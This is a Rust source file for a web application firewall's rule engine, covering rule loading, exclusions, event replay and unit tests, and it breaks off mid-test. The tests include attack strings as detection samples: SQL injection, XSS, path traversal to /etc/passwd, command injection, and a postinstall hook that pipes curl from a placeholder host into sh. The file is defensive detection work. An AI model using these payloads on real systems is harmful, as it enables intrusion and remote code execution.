use std::{collections::BTreeMap, fs, path::Path};

use percent_encoding::percent_decode_str;
use regex::Regex;
use serde::{Deserialize, Serialize};
use thiserror::Error;

use crate::{
    config::{RuleExclusionConfig, RuleSettings},
    decision::WafAction,
    event_store::SecurityEvent,
};

#[derive(Debug, Error)]
pub enum RuleError {
    #[error("invalid built-in rule regex for {rule_id}: {source}")]
    InvalidRegex {
        rule_id: String,
        source: regex::Error,
    },
    #[error("failed to read rule file {path}: {source}")]
    Io {
        path: String,
        source: std::io::Error,
    },
    #[error("rule file {path} is not valid YAML: {source}")]
    Yaml {
        path: String,
        source: serde_yaml::Error,
    },
    #[error("rule file {path} does not contain any rules")]
    EmptyRuleFile { path: String },
    #[error("no enabled rules were loaded")]
    EmptyRuleSet,
    #[error("rule {rule_id} must target at least one request component")]
    MissingTargets { rule_id: String },
    #[error("rule file {path} metadata.{field} must not be blank when metadata is provided")]
    InvalidMetadata { path: String, field: String },
    #[error("rule {rule_id} field {field} must not be blank when provided")]
    InvalidRuleMetadata { rule_id: String, field: String },
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum RuleSeverity {
    Low,
    Medium,
    High,
    Critical,
}

impl RuleSeverity {
    pub fn risk_score(self) -> u8 {
        match self {
            Self::Low => 25,
            Self::Medium => 50,
            Self::High => 80,
            Self::Critical => 95,
        }
    }

    pub fn anomaly_points(self) -> u16 {
        match self {
            Self::Low => 2,
            Self::Medium => 3,
            Self::High => 5,
            Self::Critical => 5,
        }
    }
}

impl std::fmt::Display for RuleSeverity {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let value = match self {
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        };
        formatter.write_str(value)
    }
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum PerformanceCostTier {
    Low,
    Moderate,
    High,
}

impl std::fmt::Display for PerformanceCostTier {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let value = match self {
            Self::Low => "low",
            Self::Moderate => "moderate",
            Self::High => "high",
        };
        formatter.write_str(value)
    }
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum RuleTarget {
    Path,
    Query,
    Headers,
    Body,
    UserAgent,
}

impl std::fmt::Display for RuleTarget {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let value = match self {
            Self::Path => "path",
            Self::Query => "query",
            Self::Headers => "headers",
            Self::Body => "body",
            Self::UserAgent => "user_agent",
        };
        formatter.write_str(value)
    }
}

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct RuleMatch {
    pub rule_id: String,
    pub rule_name: String,
    pub category: String,
    pub severity: RuleSeverity,
    pub matched_target: RuleTarget,
    #[serde(default = "default_rule_paranoia_level")]
    pub paranoia_level: u8,
    pub explanation: String,
    pub owasp_category: Option<String>,
}

#[derive(Debug, Clone)]
pub struct BuiltinRule {
    pub id: String,
    pub name: String,
    pub category: String,
    pub severity: RuleSeverity,
    pub performance_cost: Option<PerformanceCostTier>,
    pub target: RuleTarget,
    pub pattern: Regex,
    pub transforms: Vec<RuleTransform>,
    pub paranoia_level: u8,
    pub explanation: String,
    pub design_intent: Option<String>,
    pub owasp_category: Option<String>,
}

#[derive(Debug, Clone)]
pub struct RuleSet {
    rules: Vec<BuiltinRule>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RuleLoadReport {
    pub files: Vec<RuleFileLoadReport>,
    pub standards: Vec<String>,
    pub total_entries: usize,
    pub enabled_entries: usize,
    pub disabled_entries: usize,
    pub compiled_rules: usize,
    pub filtered_by_paranoia: usize,
    pub active_rules: usize,
    pub transform_pipelines: usize,
    pub exclusions: RuleExclusionReport,
    pub warnings: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RuleFileLoadReport {
    pub path: String,
    pub name: Option<String>,
    pub version: Option<String>,
    pub standards: Vec<String>,
    pub entries: usize,
    pub enabled_entries: usize,
    pub disabled_entries: usize,
    pub compiled_rules: usize,
    pub filtered_by_paranoia: usize,
    pub active_rules: usize,
    pub transform_pipelines: usize,
    pub unsupported_imports: usize,
    pub warnings: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RuleExclusionReport {
    pub configured: usize,
    pub scoped: usize,
    pub global: usize,
    pub disabled_rule_ids: Vec<String>,
    pub disabled_categories: Vec<String>,
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct RuleReplayReport {
    pub total_events: usize,
    pub matched_events: usize,
    pub unmatched_events: usize,
    pub excluded_events: usize,
    pub matches_before_exclusions: usize,
    pub matches_after_exclusions: usize,
    pub previously_allowed_review_candidates: usize,
    pub previously_monitored_matches: usize,
    pub previously_blocked_matches: usize,
    pub prior_rule_detection_events: usize,
    pub prior_rule_detection_overlap: usize,
    pub rule_match_counts: BTreeMap<String, usize>,
    pub replayed_targets: Vec<String>,
    pub unavailable_targets: Vec<String>,
    pub limitations: Vec<String>,
}

impl RuleSet {
    pub fn rules(&self) -> &[BuiltinRule] {
        &self.rules
    }

    pub fn rules_by_id(&self, rule_id: &str) -> Vec<&BuiltinRule> {
        self.rules
            .iter()
            .filter(|rule| rule.id == rule_id)
            .collect()
    }

    pub fn inspect(&self, parts: &RequestParts<'_>) -> Vec<RuleMatch> {
        let mut matches = Vec::new();

        for rule in &self.rules {
            let raw_haystack = match rule.target {
                RuleTarget::Path => parts.path,
                RuleTarget::Query => parts.query,
                RuleTarget::Headers => parts.headers,
                RuleTarget::Body => parts.body,
                RuleTarget::UserAgent => parts.user_agent,
            };
            let haystack = normalize_rule_input(rule.target, raw_haystack, &rule.transforms);

            if rule.pattern.is_match(&haystack) {
                matches.push(RuleMatch {
                    rule_id: rule.id.clone(),
                    rule_name: rule.name.clone(),
                    category: rule.category.clone(),
                    severity: rule.severity,
                    matched_target: rule.target,
                    paranoia_level: rule.paranoia_level,
                    explanation: rule.explanation.clone(),
                    owasp_category: rule.owasp_category.clone(),
                });
            }
        }

        matches
    }

    pub fn inspect_with_exclusions(
        &self,
        parts: &RequestParts<'_>,
        exclusions: &[RuleExclusionConfig],
    ) -> Vec<RuleMatch> {
        self.inspect(parts)
            .into_iter()
            .filter(|rule_match| !is_excluded(rule_match, parts, exclusions))
            .collect()
    }
}

pub fn validate_rule_file(
    path: &Path,
    paranoia_level: u8,
) -> Result<(RuleSet, RuleFileLoadReport), RuleError> {
    let (rules, report) = load_rule_file(path, paranoia_level)?;
    Ok((RuleSet { rules }, report))
}

pub fn replay_events(rule_set: &RuleSet, events: &[SecurityEvent]) -> RuleReplayReport {
    replay_events_with_exclusions(rule_set, events, &[])
}

pub fn replay_events_with_exclusions(
    rule_set: &RuleSet,
    events: &[SecurityEvent],
    exclusions: &[RuleExclusionConfig],
) -> RuleReplayReport {
    let mut matched_events = 0;
    let mut excluded_events = 0;
    let mut matches_before_exclusions = 0;
    let mut matches_after_exclusions = 0;
    let mut previously_allowed_review_candidates = 0;
    let mut previously_monitored_matches = 0;
    let mut previously_blocked_matches = 0;
    let mut prior_rule_detection_events = 0;
    let mut prior_rule_detection_overlap = 0;
    let mut rule_match_counts = BTreeMap::new();

    for event in events {
        let prior_rule_detection = !event.decision.matched_rules.is_empty();
        if prior_rule_detection {
            prior_rule_detection_events += 1;
        }

        let headers = event
            .evidence
            .as_ref()
            .map(|evidence| {
                evidence
                    .header_names
                    .iter()
                    .map(|name| format!("{name}: [retained-value-unavailable]"))
                    .collect::<Vec<_>>()
                    .join("\n")
            })
            .unwrap_or_default();
        let content_type = event
            .evidence
            .as_ref()
            .map(|evidence| evidence.content_type.as_str())
            .unwrap_or_default();
        let parts = RequestParts {
            method: &event.method,
            path: &event.path,
            query: &event.query,
            headers: &headers,
            content_type,
            ..RequestParts::default()
        };
        let all_matches = rule_set.inspect(&parts);
        matches_before_exclusions += all_matches.len();
        let matches = rule_set.inspect_with_exclusions(&parts, exclusions);
        matches_after_exclusions += matches.len();
        if !all_matches.is_empty() && matches.is_empty() {
            excluded_events += 1;
        }
        if matches.is_empty() {
            continue;
        }

        matched_events += 1;
        if prior_rule_detection {
            prior_rule_detection_overlap += 1;
        }
        match event.decision.action {
            WafAction::Allow => previously_allowed_review_candidates += 1,
            WafAction::Monitor => previously_monitored_matches += 1,
            WafAction::Block => previously_blocked_matches += 1,
        }
        for rule_match in matches {
            *rule_match_counts.entry(rule_match.rule_id).or_insert(0) += 1;
        }
    }

    let mut replayed_targets = Vec::new();
    let mut unavailable_targets = Vec::new();
    for rule in rule_set.rules() {
        let target = rule.target.to_string();
        let destination = match rule.target {
            RuleTarget::Path | RuleTarget::Query => &mut replayed_targets,
            RuleTarget::Headers | RuleTarget::Body | RuleTarget::UserAgent => {
                &mut unavailable_targets
            }
        };
        destination.push(target);
    }
    replayed_targets.sort();
    replayed_targets.dedup();
    unavailable_targets.sort();
    unavailable_targets.dedup();

    let mut limitations = vec![
        "Previously allowed matches are review candidates, not confirmed false positives."
            .to_string(),
        "Prior rule-detection overlap is not a labeled attack-case coverage metric.".to_string(),
    ];
    if !unavailable_targets.is_empty() {
        limitations.push(format!(
            "Retained security events cannot replay these request targets: {}.",
            unavailable_targets.join(", ")
        ));
    }
    if exclusions
        .iter()
        .any(|exclusion| !exclusion.trusted_headers.is_empty() || !exclusion.identities.is_empty())
    {
        limitations.push(
            "Retained events do not preserve trusted header values, so value and identity exclusion conditions are not replayed."
                .to_string(),
        );
    }

    RuleReplayReport {
        total_events: events.len(),
        matched_events,
        unmatched_events: events.len().saturating_sub(matched_events),
        excluded_events,
        matches_before_exclusions,
        matches_after_exclusions,
        previously_allowed_review_candidates,
        previously_monitored_matches,
        previously_blocked_matches,
        prior_rule_detection_events,
        prior_rule_detection_overlap,
        rule_match_counts,
        replayed_targets,
        unavailable_targets,
        limitations,
    }
}

impl RuleExclusionReport {
    fn from_exclusions(exclusions: &[RuleExclusionConfig]) -> Self {
        let mut disabled_rule_ids = Vec::new();
        let mut disabled_categories = Vec::new();
        let mut scoped = 0;
        let mut global = 0;

        for exclusion in exclusions {
            disabled_rule_ids.extend(exclusion.rule_ids.iter().cloned());
            disabled_categories.extend(exclusion.categories.iter().cloned());

            if exclusion.path_prefixes.is_empty()
                && exclusion.query_params.is_empty()
                && exclusion.headers.is_empty()
                && exclusion.methods.is_empty()
                && exclusion.targets.is_empty()
                && exclusion.content_types.is_empty()
                && exclusion.trusted_headers.is_empty()
                && exclusion.identities.is_empty()
            {
                global += 1;
            } else {
                scoped += 1;
            }
        }

        disabled_rule_ids.sort();
        disabled_rule_ids.dedup();
        disabled_categories.sort();
        disabled_categories.dedup();

        Self {
            configured: exclusions.len(),
            scoped,
            global,
            disabled_rule_ids,
            disabled_categories,
        }
    }
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum RuleTransform {
    UrlDecode,
    PlusToSpace,
    Lowercase,
}

impl std::fmt::Display for RuleTransform {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let value = match self {
            Self::UrlDecode => "url_decode",
            Self::PlusToSpace => "plus_to_space",
            Self::Lowercase => "lowercase",
        };
        formatter.write_str(value)
    }
}

#[derive(Debug, Default)]
pub struct RequestParts<'a> {
    pub method: &'a str,
    pub path: &'a str,
    pub query: &'a str,
    pub headers: &'a str,
    pub body: &'a str,
    pub user_agent: &'a str,
    pub content_type: &'a str,
    pub trusted_proxy: bool,
}

const DEFAULT_RULE_PACKS: &[&str] = &[
    include_str!("../configs/rules/REQUEST-913-SCANNER-DETECTION.yml"),
    include_str!("../configs/rules/REQUEST-914-AUTHENTICATION-ABUSE.yml"),
    include_str!("../configs/rules/REQUEST-916-INSECURE-DESIGN.yml"),
    include_str!("../configs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.yml"),
    include_str!("../configs/rules/REQUEST-921-CRYPTO-TRANSPORT.yml"),
    include_str!("../configs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.yml"),
    include_str!("../configs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.yml"),
    include_str!("../configs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.yml"),
    include_str!("../configs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.yml"),
    include_str!("../configs/rules/REQUEST-944-SUPPLY-CHAIN.yml"),
    include_str!("../configs/rules/REQUEST-945-INTEGRITY.yml"),
    include_str!("../configs/rules/REQUEST-949-LOGGING-ALERTING.yml"),
    include_str!("../configs/rules/REQUEST-950-EXCEPTIONAL-CONDITIONS.yml"),
];

pub fn builtin_rules() -> Result<Vec<BuiltinRule>, RuleError> {
    let mut rules = Vec::new();

    for contents in DEFAULT_RULE_PACKS {
        let (mut pack_rules, _report) =
            compile_rule_pack(contents, "<embedded saugra-waf rule pack>", u8::MAX)?;
        rules.append(&mut pack_rules);
    }

    Ok(rules)
}

pub fn load_rule_set(settings: &RuleSettings) -> Result<RuleSet, RuleError> {
    load_rule_set_with_report(settings).map(|(rule_set, _report)| rule_set)
}

pub fn load_rule_set_with_report(
    settings: &RuleSettings,
) -> Result<(RuleSet, RuleLoadReport), RuleError> {
    let mut rules = Vec::new();
    let mut report = RuleLoadReport {
        files: Vec::new(),
        standards: Vec::new(),
        total_entries: 0,
        enabled_entries: 0,
        disabled_entries: 0,
        compiled_rules: 0,
        filtered_by_paranoia: 0,
        active_rules: 0,
        transform_pipelines: 0,
        exclusions: RuleExclusionReport::from_exclusions(&settings.exclusions),
        warnings: Vec::new(),
    };
    report
        .warnings
        .extend(exclusion_warnings(&settings.exclusions));

    for path in &settings.files {
        let (mut file_rules, file_report) =
            load_rule_file(path, settings.detection_paranoia_level())?;
        report.total_entries += file_report.entries;
        report.enabled_entries += file_report.enabled_entries;
        report.disabled_entries += file_report.disabled_entries;
        report.compiled_rules += file_report.compiled_rules;
        report.filtered_by_paranoia += file_report.filtered_by_paranoia;
        report.active_rules += file_report.active_rules;
        report.transform_pipelines += file_report.transform_pipelines;
        report.warnings.extend(file_report.warnings.iter().cloned());
        report
            .standards
            .extend(file_report.standards.iter().cloned());
        report.files.push(file_report);
        rules.append(&mut file_rules);
    }

    report.standards.sort();
    report.standards.dedup();
    report
        .warnings
        .extend(contextual_exclusion_warnings(&settings.exclusions, &rules));

    if rules.is_empty() {
        return Err(RuleError::EmptyRuleSet);
    }

    Ok((RuleSet { rules }, report))
}

fn contextual_exclusion_warnings(
    exclusions: &[RuleExclusionConfig],
    rules: &[BuiltinRule],
) -> Vec<String> {
    let mut warnings = Vec::new();

    for (index, exclusion) in exclusions.iter().enumerate() {
        let label = exclusion
            .name
            .as_deref()
            .filter(|name| !name.trim().is_empty())
            .map(ToString::to_string)
            .unwrap_or_else(|| format!("#{}", index + 1));

        for rule_id in &exclusion.rule_ids {
            let matching_rules = rules
                .iter()
                .filter(|rule| &rule.id == rule_id)
                .collect::<Vec<_>>();
            if matching_rules.is_empty() {
                warnings.push(format!(
                    "rule exclusion {label} references unknown or inactive rule ID {rule_id}"
                ));
            } else if !exclusion.targets.is_empty()
                && !matching_rules
                    .iter()
                    .any(|rule| exclusion.targets.contains(&rule.target))
            {
                warnings.push(format!(
                    "rule exclusion {label} cannot match rule {rule_id} because their targets do not overlap"
                ));
            }
        }
    }

    warnings
}

fn exclusion_warnings(exclusions: &[RuleExclusionConfig]) -> Vec<String> {
    let mut warnings = Vec::new();

    for (index, exclusion) in exclusions.iter().enumerate() {
        let label = exclusion
            .name
            .as_deref()
            .filter(|name| !name.trim().is_empty())
            .map(ToString::to_string)
            .unwrap_or_else(|| format!("#{}", index + 1));
        let has_context_scope = !exclusion.path_prefixes.is_empty()
            || !exclusion.query_params.is_empty()
            || !exclusion.headers.is_empty()
            || !exclusion.methods.is_empty()
            || !exclusion.targets.is_empty()
            || !exclusion.content_types.is_empty()
            || !exclusion.trusted_headers.is_empty()
            || !exclusion.identities.is_empty();

        if !has_context_scope {
            warnings.push(format!(
                "rule exclusion {label} is global and disables matching protection across all requests"
            ));
        }
        if !exclusion.trusted_headers.is_empty() || !exclusion.identities.is_empty() {
            warnings.push(format!(
                "rule exclusion {label} depends on trusted proxy assertions and will not match direct or untrusted peers"
            ));
        }
    }

    warnings
}

pub fn inspect(parts: &RequestParts<'_>) -> Result<Vec<RuleMatch>, RuleError> {
    Ok(RuleSet {
        rules: builtin_rules()?,
    }
    .inspect(parts))
}

fn load_rule_file(
    path: &Path,
    paranoia_level: u8,
) -> Result<(Vec<BuiltinRule>, RuleFileLoadReport), RuleError> {
    let path_display = path.display().to_string();
    let contents = fs::read_to_string(path).map_err(|source| RuleError::Io {
        path: path_display.clone(),
        source,
    })?;

    compile_rule_pack(&contents, &path_display, paranoia_level)
}

fn compile_rule_pack(
    contents: &str,
    source_name: &str,
    paranoia_level: u8,
) -> Result<(Vec<BuiltinRule>, RuleFileLoadReport), RuleError> {
    let rule_file: RuleFile = serde_yaml::from_str(contents).map_err(|source| RuleError::Yaml {
        path: source_name.to_string(),
        source,
    })?;

    validate_rule_file_metadata(&rule_file, source_name)?;

    if rule_file.rules.is_empty() {
        return Err(RuleError::EmptyRuleFile {
            path: source_name.to_string(),
        });
    }

    let mut rules = Vec::new();
    let mut report = RuleFileLoadReport {
        path: source_name.to_string(),
        name: rule_file
            .metadata
            .as_ref()
            .map(|metadata| metadata.name.clone()),
        version: rule_file
            .metadata
            .as_ref()
            .map(|metadata| metadata.version.clone()),
        standards: rule_file
            .metadata
            .as_ref()
            .map(|metadata| metadata.standards.clone())
            .unwrap_or_default(),
        entries: rule_file.rules.len(),
        enabled_entries: 0,
        disabled_entries: 0,
        compiled_rules: 0,
        filtered_by_paranoia: 0,
        active_rules: 0,
        transform_pipelines: 0,
        unsupported_imports: rule_file.unsupported_imports.len(),
        warnings: rule_file_warnings(&rule_file, source_name),
    };

    for entry in rule_file.rules {
        if !entry.enabled {
            report.disabled_entries += 1;
            continue;
        }

        report.enabled_entries += 1;
        if entry.enabled && entry.targets.is_empty() {
            return Err(RuleError::MissingTargets { rule_id: entry.id });
        }
        if entry
            .design_intent
            .as_deref()
            .is_some_and(|value| value.trim().is_empty())
        {
            return Err(RuleError::InvalidRuleMetadata {
                rule_id: entry.id,
                field: "design_intent".to_string(),
            });
        }

        for definition in Vec::<RuleDefinition>::from(entry) {
            let rule = BuiltinRule::try_from(definition)?;
            report.compiled_rules += 1;
            if !rule.transforms.is_empty() {
                report.transform_pipelines += 1;
            }
            if rule.paranoia_level > paranoia_level {
                report.filtered_by_paranoia += 1;
                continue;
            }

            rules.push(rule);
            report.active_rules += 1;
        }
    }

    Ok((rules, report))
}

fn validate_rule_file_metadata(rule_file: &RuleFile, source_name: &str) -> Result<(), RuleError> {
    if let Some(metadata) = &rule_file.metadata {
        if metadata.name.trim().is_empty() {
            return Err(RuleError::InvalidMetadata {
                path: source_name.to_string(),
                field: "name".to_string(),
            });
        }

        if metadata.version.trim().is_empty() {
            return Err(RuleError::InvalidMetadata {
                path: source_name.to_string(),
                field: "version".to_string(),
            });
        }

        if metadata
            .standards
            .iter()
            .any(|standard| standard.trim().is_empty())
        {
            return Err(RuleError::InvalidMetadata {
                path: source_name.to_string(),
                field: "standards".to_string(),
            });
        }
    }

    Ok(())
}

fn rule_file_warnings(rule_file: &RuleFile, source_name: &str) -> Vec<String> {
    let mut warnings = Vec::new();

    if rule_file.metadata.is_none() {
        warnings.push(format!(
            "rule file {source_name} has no metadata.name or metadata.version"
        ));
    }

    for unsupported_import in &rule_file.unsupported_imports {
        warnings.push(format!(
            "rule file {source_name} skipped import {}: {}",
            unsupported_import
                .id
                .as_deref()
                .unwrap_or("unknown-rule-id"),
            unsupported_import.reason
        ));
    }

    warnings
}

fn normalize_rule_input(target: RuleTarget, input: &str, transforms: &[RuleTransform]) -> String {
    let mut value = input.to_string();

    for transform in transforms {
        value = match transform {
            RuleTransform::UrlDecode => percent_decode_str(&value).decode_utf8_lossy().into_owned(),
            RuleTransform::PlusToSpace if target == RuleTarget::Query && value.contains('+') => {
                value.replace('+', " ")
            }
            RuleTransform::PlusToSpace => value,
            RuleTransform::Lowercase => value.to_lowercase(),
        };
    }

    value
}

fn is_excluded(
    rule_match: &RuleMatch,
    parts: &RequestParts<'_>,
    exclusions: &[RuleExclusionConfig],
) -> bool {
    exclusions.iter().any(|exclusion| {
        exclusion_matches_rule(exclusion, rule_match)
            && exclusion_matches_method(exclusion, parts.method)
            && exclusion_matches_target(exclusion, rule_match.matched_target)
            && exclusion_matches_path(exclusion, parts.path)
            && exclusion_matches_query_params(exclusion, parts.query)
            && exclusion_matches_headers(exclusion, parts.headers)
            && exclusion_matches_content_type(exclusion, parts.content_type)
            && exclusion_matches_trusted_headers(exclusion, parts)
            && exclusion_matches_identities(exclusion, parts)
    })
}

fn exclusion_matches_rule(exclusion: &RuleExclusionConfig, rule_match: &RuleMatch) -> bool {
    exclusion
        .rule_ids
        .iter()
        .any(|rule_id| rule_id == &rule_match.rule_id)
        || exclusion
            .categories
            .iter()
            .any(|category| category == &rule_match.category)
}

fn exclusion_matches_path(exclusion: &RuleExclusionConfig, path: &str) -> bool {
    exclusion.path_prefixes.is_empty()
        || exclusion
            .path_prefixes
            .iter()
            .any(|prefix| path.starts_with(prefix))
}

fn exclusion_matches_method(exclusion: &RuleExclusionConfig, method: &str) -> bool {
    exclusion.methods.is_empty() || exclusion.methods.iter().any(|value| value == method)
}

fn exclusion_matches_target(exclusion: &RuleExclusionConfig, target: RuleTarget) -> bool {
    exclusion.targets.is_empty() || exclusion.targets.contains(&target)
}

fn exclusion_matches_query_params(exclusion: &RuleExclusionConfig, query: &str) -> bool {
    exclusion.query_params.is_empty()
        || query_param_names(query).any(|name| {
            exclusion
                .query_params
                .iter()
                .any(|excluded_name| excluded_name == &name)
        })
}

fn exclusion_matches_headers(exclusion: &RuleExclusionConfig, headers: &str) -> bool {
    exclusion.headers.is_empty()
        || header_names(headers).any(|name| {
            exclusion
                .headers
                .iter()
                .any(|excluded_name| excluded_name.eq_ignore_ascii_case(&name))
        })
}

fn exclusion_matches_content_type(exclusion: &RuleExclusionConfig, content_type: &str) -> bool {
    exclusion.content_types.is_empty()
        || exclusion.content_types.iter().any(|configured| {
            content_type
                .split(';')
                .next()
                .unwrap_or_default()
                .trim()
                .eq_ignore_ascii_case(configured.trim())
        })
}

fn exclusion_matches_trusted_headers(
    exclusion: &RuleExclusionConfig,
    parts: &RequestParts<'_>,
) -> bool {
    header_value_conditions_match(&exclusion.trusted_headers, parts)
}

fn exclusion_matches_identities(exclusion: &RuleExclusionConfig, parts: &RequestParts<'_>) -> bool {
    header_value_conditions_match(&exclusion.identities, parts)
}

fn header_value_conditions_match(
    conditions: &[crate::config::RuleExclusionHeaderValueConfig],
    parts: &RequestParts<'_>,
) -> bool {
    conditions.is_empty()
        || (parts.trusted_proxy
            && conditions.iter().all(|condition| {
                header_value(parts.headers, &condition.name).is_some_and(|actual| {
                    condition
                        .values
                        .iter()
                        .any(|expected| actual.eq_ignore_ascii_case(expected))
                })
            }))
}

fn header_value<'a>(headers: &'a str, expected_name: &str) -> Option<&'a str> {
    headers.lines().find_map(|line| {
        let (name, value) = line.split_once(':')?;
        name.trim()
            .eq_ignore_ascii_case(expected_name)
            .then_some(value.trim())
    })
}

fn query_param_names(query: &str) -> impl Iterator<Item = String> + '_ {
    query.split('&').filter_map(|pair| {
        let name = pair.split_once('=').map(|(name, _)| name).unwrap_or(pair);
        if name.is_empty() {
            None
        } else {
            Some(percent_decode_str(name).decode_utf8_lossy().into_owned())
        }
    })
}

fn header_names(headers: &str) -> impl Iterator<Item = String> + '_ {
    headers.lines().filter_map(|line| {
        line.split_once(':')
            .map(|(name, _)| name.trim().to_ascii_lowercase())
            .filter(|name| !name.is_empty())
    })
}

struct RuleDefinition {
    id: String,
    name: String,
    category: String,
    severity: RuleSeverity,
    performance_cost: Option<PerformanceCostTier>,
    target: RuleTarget,
    pattern: String,
    transforms: Vec<RuleTransform>,
    paranoia_level: u8,
    explanation: String,
    design_intent: Option<String>,
    owasp_category: Option<String>,
}

#[derive(Debug, Deserialize)]
struct RuleFile {
    #[serde(default)]
    metadata: Option<RuleFileMetadata>,
    #[serde(default)]
    unsupported_imports: Vec<UnsupportedImport>,
    rules: Vec<RuleFileEntry>,
}

#[derive(Debug, Deserialize)]
struct RuleFileMetadata {
    name: String,
    version: String,
    #[serde(default)]
    standards: Vec<String>,
}

#[derive(Debug, Deserialize)]
struct UnsupportedImport {
    #[serde(default)]
    id: Option<String>,
    reason: String,
}

#[derive(Debug, Deserialize)]
struct RuleFileEntry {
    id: String,
    name: String,
    category: String,
    severity: RuleSeverity,
    #[serde(default)]
    performance_cost: Option<PerformanceCostTier>,
    targets: Vec<RuleTarget>,
    pattern: String,
    #[serde(default)]
    transforms: Vec<RuleTransform>,
    #[serde(default = "default_rule_paranoia_level")]
    paranoia_level: u8,
    explanation: String,
    #[serde(default)]
    design_intent: Option<String>,
    #[serde(default)]
    owasp_category: Option<String>,
    #[serde(default = "default_true")]
    enabled: bool,
}

fn default_rule_paranoia_level() -> u8 {
    1
}

fn default_true() -> bool {
    true
}

impl From<RuleFileEntry> for Vec<RuleDefinition> {
    fn from(entry: RuleFileEntry) -> Self {
        if !entry.enabled {
            return Vec::new();
        }

        entry
            .targets
            .into_iter()
            .map(|target| RuleDefinition {
                id: entry.id.clone(),
                name: entry.name.clone(),
                category: entry.category.clone(),
                severity: entry.severity,
                performance_cost: entry.performance_cost,
                target,
                pattern: entry.pattern.clone(),
                transforms: entry.transforms.clone(),
                paranoia_level: entry.paranoia_level,
                explanation: entry.explanation.clone(),
                design_intent: entry.design_intent.clone(),
                owasp_category: entry.owasp_category.clone(),
            })
            .collect()
    }
}

impl TryFrom<RuleDefinition> for BuiltinRule {
    type Error = RuleError;

    fn try_from(definition: RuleDefinition) -> Result<Self, Self::Error> {
        let pattern =
            Regex::new(&definition.pattern).map_err(|source| RuleError::InvalidRegex {
                rule_id: definition.id.clone(),
                source,
            })?;

        Ok(Self {
            id: definition.id,
            name: definition.name,
            category: definition.category,
            severity: definition.severity,
            performance_cost: definition.performance_cost,
            target: definition.target,
            pattern,
            transforms: definition.transforms,
            paranoia_level: definition.paranoia_level,
            explanation: definition.explanation,
            design_intent: definition.design_intent,
            owasp_category: definition.owasp_category,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{
        config::{RuleExclusionConfig, RuleSettings, WafMode},
        decision::WafDecision,
        event_store::SecurityEvent,
    };
    use std::collections::BTreeSet;

    #[test]
    fn default_rules_cover_all_owasp_top_10_2025_categories() {
        let categories = builtin_rules()
            .unwrap()
            .into_iter()
            .filter_map(|rule| rule.owasp_category)
            .map(|category| {
                category
                    .split_once('-')
                    .map(|(id, _)| id.to_string())
                    .unwrap_or(category)
            })
            .collect::<BTreeSet<_>>();

        let expected = BTreeSet::from([
            "A01:2025".to_string(),
            "A02:2025".to_string(),
            "A03:2025".to_string(),
            "A04:2025".to_string(),
            "A05:2025".to_string(),
            "A06:2025".to_string(),
            "A07:2025".to_string(),
            "A08:2025".to_string(),
            "A09:2025".to_string(),
            "A10:2025".to_string(),
        ]);

        assert_eq!(categories, expected);
    }

    #[test]
    fn default_rule_packs_declare_owasp_2025_standard_metadata() {
        let (_rule_set, report) = load_rule_set_with_report(&RuleSettings::default()).unwrap();

        assert_eq!(report.standards, vec!["owasp-top-10:2025"]);
        assert!(report
            .files
            .iter()
            .all(|file| file.standards == vec!["owasp-top-10:2025"]));
    }

    #[test]
    fn detects_sql_injection() {
        let matches = inspect(&RequestParts {
            query: "q=' OR 1=1--",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-SQLI-001");
    }

    #[test]
    fn detects_percent_encoded_sql_injection() {
        let matches = inspect(&RequestParts {
            query: "id=1'%20OR%201=1",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-SQLI-001");
    }

    #[test]
    fn treats_plus_as_space_in_query_strings() {
        let matches = inspect(&RequestParts {
            query: "id=1'+OR+1=1",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-SQLI-001");
    }

    #[test]
    fn detects_xss() {
        let matches = inspect(&RequestParts {
            query: "text=<script>alert(1)</script>",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-XSS-001");
    }

    #[test]
    fn detects_path_traversal() {
        let matches = inspect(&RequestParts {
            path: "/download/../../../../etc/passwd",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-PATH-001");
    }

    #[test]
    fn detects_path_traversal_in_query_string() {
        let matches = inspect(&RequestParts {
            query: "file=../../../../etc/passwd",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-PATH-002");
        assert_eq!(matches[0].matched_target, RuleTarget::Query);
    }

    #[test]
    fn detects_command_injection() {
        let matches = inspect(&RequestParts {
            query: "cmd=whoami; cat /etc/passwd",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-CMD-001");
    }

    #[test]
    fn detects_supply_chain_install_script_payload() {
        let matches = inspect(&RequestParts {
            body: r#"{"scripts":{"postinstall":"curl https://example.invalid/i.sh | sh"}}"#,
            ..RequestParts::default()
        })
        .unwrap();

